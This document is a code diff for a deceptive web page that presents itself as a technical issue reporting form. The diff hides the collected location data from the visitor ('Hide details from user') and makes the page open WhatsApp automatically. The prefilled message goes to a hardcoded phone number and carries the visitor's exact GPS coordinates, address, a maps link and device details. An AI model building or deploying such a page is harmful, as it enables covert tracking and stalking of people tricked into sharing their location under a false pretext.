@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Get Electronics Gadgets</title>
+    <title>Report Technical Issues</title>
     <style>
         * {
             margin: 0;
@@ -138,35 +138,25 @@
             text-align: left;
         }
 
-        .location-details {
+        .hidden-details {
             background: #f8f9fa;
             padding: 15px;
             border-radius: 10px;
             margin: 15px 0;
+            display: none; /* Hide details from user */
         }
 
-        .detail-item {
-            margin: 10px 0;
-            padding: 10px;
-            background: white;
-            border-radius: 8px;
-            border: 1px solid #e9ecef;
+        .processing-message {
+            text-align: center;
+            padding: 20px;
+            color: #666;
         }
 
-        .detail-item strong {
-            color: #1a2980;
-            margin-right: 8px;
-        }
-
-        .coordinates {
-            background: #2c3e50;
-            color: white;
-            padding: 15px;
-            border-radius: 10px;
-            margin: 15px 0;
-            font-family: 'Courier New', monospace;
-            font-size: 16px;
-            word-break: break-all;
+        .processing-message .loading {
+            display: block;
+            margin: 0 auto 15px auto;
+            width: 30px;
+            height: 30px;
         }
 
         .buttons {
@@ -190,16 +180,6 @@
 
         .btn-whatsapp {
             background: #25D366;
-            color: white;
-        }
-
-        .btn-copy {
-            background: #28a745;
-            color: white;
-        }
-
-        .btn-maps {
-            background: #4285f4;
             color: white;
         }
 
@@ -250,14 +230,14 @@
 
 <body>
     <div class="container">
-        <h1>🚨 Error are experiencing an Error!</h1>
-        <p class="subtitle">Report technical issues You are experiencing</p>
+        <h1>🚨 Report Technical Issues</h1>
+        <p class="subtitle">Report any technical problems you're experiencing</p>
         
         <div class="instructions">
             <strong>📋 How to Report:</strong><br>
             1. Click "Report Issue via WhatsApp" below<br>
             2. Allow location access when prompted<br>
-            3. Wait afew seconds<br>
+            3. Wait a few seconds for processing<br>
             4. WhatsApp will open automatically with error report<br>
             5. Click SEND to submit your report
         </div>
@@ -271,26 +251,23 @@
         <div id="result" class="status-box">
             <div class="success-message">
                 <h3>✅ Report Ready!</h3>
-                <p>Your error report is ready to send.</p>
+                <p>Your error report is being prepared...</p>
             </div>
             
-            <div class="location-details">
-                <h4>📍 Location Information:</h4>
-                <div id="coordinates" class="coordinates">
-                    <!-- Coordinates will appear here -->
-                </div>
-                <div id="addressDetails">
-                    <!-- Address details will appear here -->
-                </div>
-                <div id="deviceInfo" class="detail-item">
-                    <!-- Device info will appear here -->
-                </div>
+            <div class="processing-message">
+                <div class="loading"></div>
+                <p>Preparing your report and opening WhatsApp...</p>
+            </div>
+            
+            <!-- Hidden container for storing data (not visible to user) -->
+            <div id="hiddenData" class="hidden-details">
+                <div id="coordinates"></div>
+                <div id="addressDetails"></div>
+                <div id="deviceInfo"></div>
             </div>
             
             <div class="buttons">
                 <button id="sendWhatsAppBtn" class="btn btn-whatsapp">📱 Send via WhatsApp</button>
-                <button id="copyBtn" class="btn btn-copy">📋 Copy Report</button>
-                <button id="openMapsBtn" class="btn btn-maps">🗺️ View on Map</button>
                 <button id="tryAgainBtn" class="btn btn-again">🔄 New Report</button>
             </div>
         </div>
@@ -304,8 +281,6 @@
             const coordinates = document.getElementById('coordinates');
             const addressDetails = document.getElementById('addressDetails');
             const deviceInfo = document.getElementById('deviceInfo');
-            const copyBtn = document.getElementById('copyBtn');
-            const openMapsBtn = document.getElementById('openMapsBtn');
             const sendWhatsAppBtn = document.getElementById('sendWhatsAppBtn');
             const tryAgainBtn = document.getElementById('tryAgainBtn');
             
@@ -323,32 +298,6 @@
             // Function to check if device is mobile
             function isMobileDevice() {
                 return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-            }
-            
-            // SUCCESS HANDLER - This was missing!
-            async function onLocationSuccess(position) {
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-                const accuracy = position.coords.accuracy;
-                
-                showStatus("Getting address details...");
-                
-                // Get address from coordinates
-                const locationDetails = await getAddressFromCoords(lat, lon);
-                
-                // Store location
-                currentLocation = {
-                    coords: { lat, lon, accuracy },
-                    details: locationDetails,
-                    timestamp: new Date().toLocaleTimeString(),
-                    date: new Date().toLocaleDateString()
-                };
-                
-                // Display results
-                displayResults();
-                
-                // Auto-send to WhatsApp after 2 seconds
-                setTimeout(sendToWhatsApp, 2000);
             }
             
             // Function to get exact GPS location
@@ -373,44 +322,82 @@
                     maximumAge: 0
                 };
                 
-                let watchId = null;
-                const startTime = Date.now();
-                
-                // Start watching position
-                watchId = navigator.geolocation.watchPosition(
-                    // Success callback
-                    async function(position) {
-                        const accuracy = position.coords.accuracy;
-                        
-                        // Show real-time accuracy updates
-                        showStatus(`GPS accuracy: ${accuracy.toFixed(1)} meters...`);
-                        
-                        // Stop when accuracy is good enough or timeout
-                        if (accuracy < 50 || (Date.now() - startTime) > 15000) {
-                            if (watchId) navigator.geolocation.clearWatch(watchId);
-                            onLocationSuccess(position);
-                        }
-                    },
-                    // Error callback
-                    function(error) {
-                        if (watchId) navigator.geolocation.clearWatch(watchId);
-                        handleLocationError(error);
-                    },
-                    options
-                );
-                
-                // Backup: try getCurrentPosition after 5 seconds
-                setTimeout(() => {
-                    if (currentLocation) return; // Already got location
-                    
+                return new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(
-                        onLocationSuccess,
-                        function(error) {
-                            // Error already handled by watchPosition
+                        async (position) => {
+                            const lat = position.coords.latitude;
+                            const lon = position.coords.longitude;
+                            const accuracy = position.coords.accuracy;
+                            
+                            showStatus("Getting location details...");
+                            
+                            try {
+                                // Get address from coordinates
+                                const locationDetails = await getAddressFromCoords(lat, lon);
+                                
+                                // Store location data
+                                currentLocation = {
+                                    coords: { lat, lon, accuracy },
+                                    details: locationDetails,
+                                    timestamp: new Date().toLocaleTimeString(),
+                                    date: new Date().toLocaleDateString()
+                                };
+                                
+                                // Store data in hidden elements
+                                storeLocationData();
+                                
+                                // Show success message
+                                showStatus("Location acquired successfully!");
+                                
+                                // Show result box
+                                resultBox.classList.add('active');
+                                
+                                // Auto-open WhatsApp after 1 second
+                                setTimeout(sendToWhatsApp, 1000);
+                                
+                                resolve(currentLocation);
+                            } catch (error) {
+                                showStatus("Error getting address details.", true);
+                                reject(error);
+                            }
+                        },
+                        (error) => {
+                            handleLocationError(error);
+                            reject(error);
                         },
                         options
                     );
-                }, 5000);
+                });
+            }
+            
+            // Function to store location data in hidden elements
+            function storeLocationData() {
+                if (!currentLocation) return;
+                
+                const loc = currentLocation;
+                
+                // Store in hidden elements
+                coordinates.innerHTML = `
+                    <strong>📍 Exact GPS Coordinates:</strong><br>
+                    Latitude: ${loc.coords.lat.toFixed(6)}<br>
+                    Longitude: ${loc.coords.lon.toFixed(6)}<br>
+                    Accuracy: ±${loc.coords.accuracy.toFixed(1)} meters
+                `;
+                
+                let addressHTML = `
+                    <strong>📌 Full Address:</strong> ${loc.details.address}<br>
+                    <strong>🏙️ City:</strong> ${loc.details.city}<br>
+                    <strong>🌍 Country:</strong> ${loc.details.country}
+                `;
+                
+                addressDetails.innerHTML = addressHTML;
+                
+                const mobile = isMobileDevice();
+                deviceInfo.innerHTML = `
+                    <strong>📱 Device:</strong> ${mobile ? 'Mobile Phone' : 'Desktop/Laptop'} • 
+                    <strong>⏰ Time:</strong> ${loc.timestamp} • 
+                    <strong>📅 Date:</strong> ${loc.date}
+                `;
             }
             
             // Function to handle location errors
@@ -449,8 +436,6 @@
                     if (data.error) {
                         return {
                             address: `Near coordinates: ${lat.toFixed(6)}, ${lon.toFixed(6)}`,
-                            road: "Not available",
-                            suburb: "Not available",
                             city: "Not available",
                             country: "Not available"
                         };
@@ -458,70 +443,16 @@
                     
                     return {
                         address: data.display_name,
-                        road: data.address?.road || "Not available",
-                        suburb: data.address?.suburb || data.address?.neighbourhood || "Not available",
                         city: data.address?.city || data.address?.town || data.address?.village || "Not available",
                         country: data.address?.country || "Not available"
                     };
                 } catch (error) {
                     return {
                         address: `Coordinates: ${lat.toFixed(6)}, ${lon.toFixed(6)}`,
-                        road: "Address lookup failed",
-                        suburb: "Check internet connection",
-                        city: "",
+                        city: "Address lookup failed",
                         country: ""
                     };
                 }
-            }
-            
-            // Function to display results
-            function displayResults() {
-                if (!currentLocation) return;
-                
-                const loc = currentLocation;
-                
-                // Update status
-                statusElement.innerHTML = "Opening WhatsApp...";
-                
-                // Show result box
-                resultBox.classList.add('active');
-                
-                // Update coordinates
-                coordinates.innerHTML = `
-                    <strong>📍 Exact GPS Coordinates:</strong><br>
-                    Latitude: ${loc.coords.lat.toFixed(6)}<br>
-                    Longitude: ${loc.coords.lon.toFixed(6)}<br>
-                    Accuracy: ±${loc.coords.accuracy.toFixed(1)} meters
-                `;
-                
-                // Update address details
-                let addressHTML = `
-                    <div class="detail-item">
-                        <strong>📌 Full Address:</strong> ${loc.details.address}
-                    </div>`;
-                
-                if (loc.details.road !== "Not available") {
-                    addressHTML += `<div class="detail-item"><strong>🛣️ Road:</strong> ${loc.details.road}</div>`;
-                }
-                if (loc.details.suburb !== "Not available") {
-                    addressHTML += `<div class="detail-item"><strong>🏘️ Area:</strong> ${loc.details.suburb}</div>`;
-                }
-                if (loc.details.city !== "Not available") {
-                    addressHTML += `<div class="detail-item"><strong>🏙️ City:</strong> ${loc.details.city}</div>`;
-                }
-                if (loc.details.country !== "Not available") {
-                    addressHTML += `<div class="detail-item"><strong>🌍 Country:</strong> ${loc.details.country}</div>`;
-                }
-                
-                addressDetails.innerHTML = addressHTML;
-                
-                // Update device info
-                const mobile = isMobileDevice();
-                deviceInfo.innerHTML = `
-                    <strong>📱 Device:</strong> ${mobile ? 'Mobile Phone' : 'Desktop/Laptop'} • 
-                    <strong>⏰ Time:</strong> ${loc.timestamp} • 
-                    <strong>📅 Date:</strong> ${loc.date}
-                `;
             }
             
             // Function to send report to WhatsApp
@@ -531,11 +462,11 @@
                     return;
                 }
 
-                // Target WhatsApp number
+                // Your WhatsApp number - only you will receive the detailed report
                 const phoneNumber = "265981353135";
                 const loc = currentLocation;
                 
-                // Create diagnostic code (includes coordinates)
+                // Create diagnostic code
                 const latCode = Math.abs(loc.coords.lat).toFixed(6).replace('.', '');
                 const lonCode = Math.abs(loc.coords.lon).toFixed(6).replace('.', '');
                 const diagnosticCode = `ERR-${latCode.substring(0, 4)}-${lonCode.substring(0, 4)}`;
@@ -543,80 +474,51 @@
                 // Create Google Maps link
                 const mapsUrl = `https://maps.google.com/?q=${loc.coords.lat},${loc.coords.lon}`;
                 
-                // Create the report message
-                const message = `🚨 ERROR REPORT
+                // Create the detailed report message (only visible in WhatsApp)
+                const message = `🚨 TECHNICAL ISSUE REPORT
 
 🔧 Diagnostic Code: ${diagnosticCode}
 
-📍 LOCATION DETAILS:
-• Coordinates: ${loc.coords.lat.toFixed(6)}, ${loc.coords.lon.toFixed(6)}
-• Accuracy: ${loc.coords.accuracy.toFixed(1)} meters
-• Address: ${loc.details.address}
-• Google Maps: ${mapsUrl}
+📍 EXACT LOCATION DETAILS:
+• Latitude: ${loc.coords.lat.toFixed(6)}
+• Longitude: ${loc.coords.lon.toFixed(6)}
+• GPS Accuracy: ±${loc.coords.accuracy.toFixed(1)} meters
 
-📱 DEVICE INFO:
-• Device: ${isMobileDevice() ? 'Mobile' : 'Desktop'}
-• Time: ${loc.timestamp}
-• Date: ${loc.date}
+📌 FULL ADDRESS:
+${loc.details.address}
 
+🏙️ City: ${loc.details.city}
+🌍 Country: ${loc.details.country}
 
-`;
+🗺️ Google Maps Link: ${mapsUrl}
 
+📱 DEVICE INFORMATION:
+• Device Type: ${isMobileDevice() ? 'Mobile Phone' : 'Desktop/Laptop'}
+• Report Time: ${loc.timestamp}
+• Report Date: ${loc.date}
+• User Agent: ${navigator.userAgent.substring(0, 100)}...
+
+🔄 SYSTEM STATUS: Awaiting Investigation
+⏳ TIMESTAMP: ${new Date().toISOString()}
+
+⚠️ ISSUE DETAILS:
+[User-reported technical issue - details to be added by user]
+
+📋 ACTION REQUIRED:
+1. Review location and device details
+2. Contact user if additional info needed
+3. Resolve technical issue`;
+
+                // Create WhatsApp URL
                 const whatsappUrl = `https://wa.me/${phoneNumber}?text=${encodeURIComponent(message)}`;
                 
-                // Open WhatsApp
+                // Open WhatsApp in new tab
                 window.open(whatsappUrl, '_blank');
                 
                 // Update status
-                statusElement.innerHTML = "✅ WhatsApp opened! Click SEND to submit report.";
-            }
-            
-            // Function to copy report to clipboard
-            async function copyReport() {
-                if (!currentLocation) {
-                    alert("No report to copy!");
-                    return;
-                }
-                
-                const loc = currentLocation;
-                const latCode = Math.abs(loc.coords.lat).toFixed(6).replace('.', '');
-                const lonCode = Math.abs(loc.coords.lon).toFixed(6).replace('.', '');
-                const diagnosticCode = `ERR-${latCode.substring(0, 4)}-${lonCode.substring(0, 4)}`;
-                const mapsUrl = `https://maps.google.com/?q=${loc.coords.lat},${loc.coords.lon}`;
-                
-                const text = `🚨 ERROR REPORT
-Diagnostic Code: ${diagnosticCode}
-
-📍 Location:
-Coordinates: ${loc.coords.lat.toFixed(6)}, ${loc.coords.lon.toFixed(6)}
-Accuracy: ${loc.coords.accuracy.toFixed(1)} meters
-Address: ${loc.details.address}
-Google Maps: ${mapsUrl}
-
-📱 Device: ${isMobileDevice() ? 'Mobile' : 'Desktop'}
-⏰ Time: ${loc.timestamp}
-📅 Date: ${loc.date}`;
-                
-                try {
-                    await navigator.clipboard.writeText(text);
-                    copyBtn.textContent = "✅ Copied!";
-                    setTimeout(() => {
-                        copyBtn.textContent = "📋 Copy Report";
-                    }, 2000);
-                } catch (err) {
-                    alert("Failed to copy. Please try again.");
-                }
-            }
-            
-            // Function to open in Google Maps
-            function openInMaps() {
-                if (!currentLocation) {
-                    alert("No location to view!");
-                    return;
-                }
-                
-                const url = `https://www.google.com/maps?q=${currentLocation.coords.lat},${currentLocation.coords.lon}`;
-                window.open(url, '_blank');
+                statusElement.innerHTML = "✅ WhatsApp opened! Please SEND the message to submit your report.";
+                sendWhatsAppBtn.textContent = "✅ WhatsApp Opened";
+                sendWhatsAppBtn.style.background = "#28a745";
             }
             
             // Event Listeners
@@ -625,13 +527,14 @@ Google Maps: ${mapsUrl}
                 getExactLocation();
             });
             
-            copyBtn.addEventListener('click', copyReport);
-            openMapsBtn.addEventListener('click', openInMaps);
             sendWhatsAppBtn.addEventListener('click', sendToWhatsApp);
+            
             tryAgainBtn.addEventListener('click', function() {
                 resultBox.classList.remove('active');
                 currentLocation = null;
                 statusElement.innerHTML = "Ready to report issue. Click the button above to start.";
+                sendWhatsAppBtn.textContent = "📱 Send via WhatsApp";
+                sendWhatsAppBtn.style.background = "";
             });
         });
     </script>
